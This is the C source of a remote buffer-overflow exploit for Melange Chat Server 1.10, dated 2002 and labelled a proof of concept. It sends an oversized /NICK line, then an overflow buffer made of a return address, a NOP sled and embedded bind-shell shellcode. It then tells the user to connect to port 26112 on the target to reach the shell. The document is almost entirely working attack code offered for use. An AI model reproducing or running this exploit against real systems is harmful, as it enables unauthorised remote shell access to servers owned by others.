/*
   Proof of Concept for Melange Chat Server 1.10
   a lame remote bof exploit by innerphobia <up2u_@hotmail.com> 12/24/02

   Credits go to:
   - iDefense Labs for the advisory
   - blink for discovering the bug
   - Irian for the shellcode

   With careful calculation it is *possible* to control even the EIP,
   not just one byte of EIP.
   There are to a few things that will happen if we use a wrong ret address:
   1. Seg fault / shut down.
   2. Keep on going < nothing happens >.

   Code tested on Suse 8.0 and RH 7.3
   Merry Xmas :)
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

// magic numbers begin here
#define ADDR 0xbfffd490
#define NICKLEN 49
#define BUFFLEN 463
// magic numbers end

// brutally copied from Irian's cy.c
char evil[]=
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\x52\x50\xcd\x80\x43"
"\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\x52\x50\xb0\x66\xcd\x80\x89\xe1\xb3\x04"
"\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x89\xd9\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x52"
"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc,char **argv){
    int i,j=0,sock,port = 6666;
    char *host;
    char nick[NICKLEN],buff[BUFFLEN];
    struct hostent *htent;
    struct sockaddr_in serv_addr;
    long jump = ADDR;
    u_long *ptr = (u_long *)buff;

    if(argc>4||argc<2)
        printf("Usage : %s [hostname] [ret address in hex (0x41414141)] 
[port]\n",argv[0]),exit(1);

    host=argv[1];
    if(argc>2) sscanf(argv[2],"0x%lx",&jump);
    if(argc>3) port=atoi(argv[3]);

    if((htent = gethostbyname(argv[1])) != NULL && (sock = 
socket(AF_INET,SOCK_STREAM,0)) != -1){

        serv_addr.sin_family = AF_INET;
        memcpy((char 
*)&serv_addr.sin_addr.s_addr,htent->h_addr_list[0],htent->h_length);
        serv_addr.sin_port = htons(port);

        if(!connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr))){

            printf("Connected to %s at %d [0x%lx]\nTrying to send %d chars 
NICKNAME\n",host,port,jump,sizeof(nick)-6);

            memset(nick,'A',sizeof(nick)),memcpy(nick,"/NICK ",6);

            if(send(sock,nick,sizeof(nick),0) == -1)
                perror("Sending nickname failed\n"),exit(1);
            sleep(1);

            for(i=0;i<sizeof(buff);i+=4) *(ptr++)=jump;
            for(i=0;i<sizeof(buff)-200-strlen(evil);i++) buff[i]=0x90;
            for(j=0;j<strlen(evil);j++) buff[i++]=evil[j];

            printf("Trying to send overflow string\n");

            if(send(sock,buff,sizeof(buff),0) == -1)
                perror("Sending overflow failed :(\n"),exit(1);

            sleep(1);
            printf("Now try to connect to host : %s port : 26112\n",host);
            close(sock);
        }
        else printf("Can't connect to %s at %d\n",host,port),exit(1);
    }
}
